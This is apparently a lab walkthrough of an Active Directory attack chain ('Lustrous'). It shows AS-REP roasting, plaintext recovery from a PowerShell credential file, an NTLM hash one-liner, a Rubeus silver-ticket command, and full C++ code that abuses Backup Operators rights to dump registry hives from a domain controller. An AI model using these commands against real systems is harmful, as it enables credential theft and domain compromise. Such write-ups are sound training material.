# Lustrous (chain) (medium)

## port scan

![](walkthrough_20240411131333242.png)

![](walkthrough_20240411120000539.png)

## service enumeration

ftp allow anonymous login

![](walkthrough_20240411115748466.png)

some user directory

![](walkthrough_20240411115819698.png)

have a users.csv

![](walkthrough_20240411120158629.png)

![](walkthrough_20240411120215821.png)

![](walkthrough_20240411120549548.png)

## ASREPRoast

ben.cox user lack of Kerberos pre-authentication

![](walkthrough_20240411120752163.png)

![](walkthrough_20240411120959828.png)

we can winrm into LUSMS

![](walkthrough_20240411122234308.png)

## privilege escalation on lusms

there have admin.xml (PSCred)

![](walkthrough_20240411122350299.png)

we can use those powershell command get plain password

```powershell
$AdminCred = Import-Clixml -Path C:\users\ben.cox\desktop\admin.xml
$Password = $AdminCred.GetNetworkCredential().Password
```

![](walkthrough_20240411122957202.png)

![](walkthrough_20240411123200016.png)

## spn user

there are some service account

![](walkthrough_20240411125825486.png)

hashcat

![](walkthrough_20240411130043908.png)

now we have svc_web password

convert to hash

```bash
python -c 'import hashlib,binascii; print(binascii.hexlify(hashlib.new("md4", "iydgTvmujl6f".encode("utf-16le")).digest()))'
```

![](walkthrough_20240411140926704.png)

## silver ticket

![](walkthrough_20240411140823406.png)

the tony.ward is backup

we can use rubeus to make a silver ticket login web page as `tony.ward` user. (those sid/id get from bloodhound)

```
dotnet inline-execute /opt/Rubeus.exe silver /service:http/lusdc.lustrous.vl /rc4:e67af8b3d78df5a02eb0d57b6cb60717 /user:tony.ward /domain:lustrous.vl /sid:S-1-5-21-2355092754-1584501958-1513963426 /id:1114 /nowrap /ptt
```

![](walkthrough_20240411135910226.png)

```powershell
powershell Invoke-WebRequest -Uri http://lusdc.lustrous.vl/Internal -UseDefaultCredentials -UseBasicParsing | Select-Object -Expand Content
```

![](walkthrough_20240411140048121.png)

## abuse backup admin

there have a code can remote dump sam with backup user

https://github.com/Wh04m1001/Random/blob/main/BackupOperators.cpp

```cpp
#include <stdio.h>
#include <windows.h>

void MakeToken() {
    HANDLE token;
    const char username[] = "tony.ward";
    const char password[] = "U_cPVQqEI50i1X";
    const char domain[] = "lustrous.vl";

    if (LogonUserA(username, domain, password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &token) == 0) {
        printf("LogonUserA: %d\n", GetLastError());
        exit(0);
    }
    if (ImpersonateLoggedOnUser(token) == 0) {
        printf("ImpersonateLoggedOnUser: %d\n", GetLastError());
        exit(0);
    }
}

int main()
{
    HKEY hklm;
    HKEY hkey;
    DWORD result;
    const char* hives[] = { "SAM","SYSTEM","SECURITY" };
    const char* files[] = { "C:\\windows\\temp\\sam.hive","C:\\windows\\temp\\system.hive","C:\\windows\\temp\\security.hive" };

    //Uncomment if using alternate credentials.
    MakeToken();

    result = RegConnectRegistryA("\\\\lusdc.lustrous.vl", HKEY_LOCAL_MACHINE,&hklm);
    if (result != 0) {
        printf("RegConnectRegistryW: %d\n", result);
        exit(0);
    }
    for (int i = 0; i < 3; i++) {

        printf("Dumping %s hive to %s\n", hives[i], files[i]);
        result = RegOpenKeyExA(hklm, hives[i], REG_OPTION_BACKUP_RESTORE | REG_OPTION_OPEN_LINK, KEY_READ, &hkey);
        if (result != 0) {
            printf("RegOpenKeyExA: %d\n", result);
            exit(0);
        }
        result = RegSaveKeyA(hkey, files[i], NULL);
        if (result != 0) {
            printf("RegSaveKeyA: %d\n", result);
            exit(0);
        }
    }
}

```

compile code

```bash
x86_64-w64-mingw32-g++ ./dump.cpp -o dump
```

those file will save at dc machine

![](walkthrough_20240411150636036.png)

we can use smbclient download those file

![](walkthrough_20240411150617663.png)

use pypykatz to get dc machine hash

![](walkthrough_20240411151014308.png)

dump all!

![](walkthrough_20240411151417319.png)

![](walkthrough_20240411151527456.png)
